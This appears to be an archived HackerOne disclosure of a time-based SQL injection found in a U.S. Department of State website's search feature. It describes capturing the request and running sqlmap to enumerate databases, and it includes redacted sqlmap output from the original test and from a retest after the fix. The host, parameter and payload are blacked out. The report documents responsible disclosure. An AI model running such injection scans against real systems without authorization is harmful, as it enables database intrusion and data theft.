---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2023-04-20
submitted: 2023-02-18T18:25:48.344Z
bounty_usd: null
votes: 64
cve: []
program: "[[programs/us-department-of-state|U.S. Department of State]]"
reporter: "shadow-krd"
source: "https://hackerone.com/reports/1878584"
title: "Time Based SQL Injection"
---
# Time Based SQL Injection

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 64 | **Program:** U.S. Department of State | **Disclosed:** 2023-04-20

- Report: [https://hackerone.com/reports/1878584](https://hackerone.com/reports/1878584)
- CWE: SQL Injection
- Submitted: 2023-02-18T18:25:48.344Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello and greetings and respect to you, dear friends
We all know that the sql injection bug is very dangerous, so this bug should be eliminated as soon as possible.
I've identified an SQL injection vulnerability of  type  Time Based on█████████ ██████ 
Below, we see how we found this vulnerability 
If you look carefully, we see that search in the website name Search results The gap has occurred there
as you can see ████████ Method  [██████████████/?███████ ]
now it's time to inject or generate POC with lovely tool sqlmap 
We used a text file here by Name request.txt
and this is our command in sqlmap you can use this command for your own confidence

███ █████████
===========================================================================================
███████████/?██████ HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer:█████████/?███
Content-Length: 133
Cookie: ███████
Connection: Close
██████
======================================================================================
 ████ █████
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.1.5#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   ██████████

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ ██████████ █████

[████] [INFO] parsing HTTP request from 'request'
[███████] ███
[███████] █████████████ Firefox/3.0b5' from file '/home/ubuntu/sqlmap/data/txt/user-agents.txt'
█████ ████████ body. Do you want to process it? [Y/n/q] Y
[█████] [INFO] resuming back-end █████████S 'mysql'
[███] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) ██████)
   ██████████
    ██████████
   █████████
---
[████] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[████████] [INFO] the back-end ██████████████
████
back-end ████S: ███████
[████████] [INFO] fetching database names
[███████] [INFO] fetching number of databases
[█████████] [WARNING] reflective value(s) found and filtering out
[████████] ███
[██████████]████████
[██████████]███████
[████] ██████
[██████]█████████
[█████]████
[█████]█████████
[██████]████████
[██████]██████
[███] █████████
[██████████]██████████
[███████] ██████
[██████████]████████
[█████████]█████████
[█████████]███
[██████]██████
[██████]█████
[████████]██████████
[███████]████████
available databases [6]:
███
████
██████████
█████████
███████
███

Notice:
I didn't extracted any data from the database, but just for generate POC

## Impact

the hackers can be dump all information like all database tables then after that login to the website

available databases [6]:
█████████
██████████
██████
█████
█████████
███

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **2023-03-08** @shadow-krd: Hello Team U.S. Department of State 

Any updates?  

Thanks & Regards,
@Shadow1krd
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **2023-03-15** @shadow-krd: This is fixed
=========
The injection is no longer able to be exploited:
--------------------------------------------------




```javascript
 ███████ ███                         
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.1.5#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   █████████

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ ████/

[████] [INFO] parsing HTTP request from 'request'
[████████] ███
[██████] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5' from file '/home/ubuntu/sqlmap/data/txt/user-agents.txt'
██████████ ███ body. Do you want to process it? [Y/n/q] Y
[███████] [INFO] resuming back-end █████S ██████████
[█████] [INFO] testing connection to the target URL
[█████] ██████████
[█████] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) ████)
   ████
    ██████████
   █████
---
[█████████] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[███] [INFO] the back-end ██████████
back-end ███S: █████
[███████] [INFO] fetching database names
[███] [INFO] fetching number of databases
[█████] █████████
[██████]██████████
[███] [INFO] retrieved: 
[████] [WARNING] unexpected HTTP code '403' detected. Will use (extra) validation step in similar cases

[████] [INFO] retrieved: 
[█████] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[███████]█████████
[████] [INFO] retrieved: 
[████████] [INFO] retrieved: 
[████]█████
[███] [INFO] retrieved: 
[████████] [INFO] retrieved: 
[███]█████
[█████████] [INFO] retrieved: 
[██████████] [INFO] retrieved: 
[█████████]███
[████████] [INFO] retrieved: 
[█████████] [INFO] retrieved: 
[█████]████████
[████] [INFO] retrieved: 
[████████] [INFO] retrieved: 
[██████████] [INFO] falling back to current database
[█████████] [INFO] fetching current database
[██████]█████
[██████] [INFO] retrieved: 
[████] [INFO] retrieved: 
[███] [CRITICAL] unable to retrieve the database names
[█████] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 44 times
[███] [INFO] fetched data logged to text files under '/home/ubuntu/.local/share/sqlmap/output/██████████'

[*] ending @ ████████/
```
- **Agreed On Going Public**
- **Report Became Public**
